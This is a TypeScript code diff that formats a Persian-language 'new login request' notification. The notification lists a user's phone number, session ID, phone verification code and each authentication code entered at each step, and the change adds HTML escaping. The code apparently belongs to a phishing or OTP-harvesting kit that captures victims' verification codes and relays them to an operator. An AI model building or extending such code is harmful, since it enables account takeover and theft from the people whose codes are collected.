@@ -235,37 +235,46 @@ export const getSession = (sessionId: string): UserSession | undefined => {
  * Format initial message with all session data
  */
 const formatInitialMessage = (session: UserSession): string => {
-  let message = `
-🔔 <b>درخواست ورود جدید</b>
+  // Escape HTML characters in user data
+  const escapeHtml = (text: string): string => {
+    return text
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;")
+      .replace(/'/g, "&#39;");
+  };
 
-📱 <b>شماره همراه:</b> <code>${session.phoneNumber}</code>
-🆔 <b>Session ID:</b> <code>${session.sessionId}</code>
-⏰ <b>زمان شروع:</b> ${session.startTime}
-📍 <b>وضعیت فعلی:</b> ${getCurrentStepText(session.currentStep)}
+  let message = `🔔 <b>درخواست ورود جدید</b>
 
-`;
+📱 <b>شماره همراه:</b> <code>${escapeHtml(session.phoneNumber)}</code>
+🆔 <b>Session ID:</b> <code>${escapeHtml(session.sessionId)}</code>
+⏰ <b>زمان شروع:</b> ${escapeHtml(session.startTime)}
+📍 <b>وضعیت فعلی:</b> ${escapeHtml(getCurrentStepText(session.currentStep))}`;
 
   // Add phone verification code if exists
   if (session.phoneVerificationCode) {
-    message += `✅ <b>کد تایید شماره:</b> <code>${session.phoneVerificationCode}</code>\n`;
+    message += `\n\n✅ <b>کد تایید شماره:</b> <code>${escapeHtml(session.phoneVerificationCode)}</code>`;
   }
 
   // Add auth steps data
-  Object.keys(session.authCodes).forEach((stepType) => {
-    const codes = session.authCodes[stepType];
-    const attempts = session.authAttempts[stepType] || 0;
+  if (session.authCodes && Object.keys(session.authCodes).length > 0) {
+    Object.keys(session.authCodes).forEach((stepType) => {
+      const codes = session.authCodes[stepType];
+      if (codes && codes.length > 0) {
+        message += `\n\n🔐 <b>${escapeHtml(getStepDisplayName(stepType))}:</b>`;
 
-    message += `\n🔐 <b>${getStepDisplayName(stepType)}:</b>\n`;
-
-    codes.forEach((code, index) => {
-      message += `   ${index + 1}. <code>${code}</code>\n`;
+        codes.forEach((code, index) => {
+          message += `\n   ${index + 1}. <code>${escapeHtml(code)}</code>`;
+        });
+      }
     });
-  });
+  }
 
-  message += `\n📊 <b>مراحل تکمیل شده:</b> ${session.completedSteps.length}`;
-  message += `\n🕐 <b>آخرین به‌روزرسانی:</b> ${new Date().toLocaleString("fa-IR")}`;
+  message += `\n\n📊 <b>مراحل تکمیل شده:</b> ${session.completedSteps?.length || 0}`;
+  message += `\n🕐 <b>آخرین به‌روزرسانی:</b> ${escapeHtml(new Date().toLocaleString("fa-IR"))}`;
 
-  return message.trim();
+  return message;
 };
 
 /**
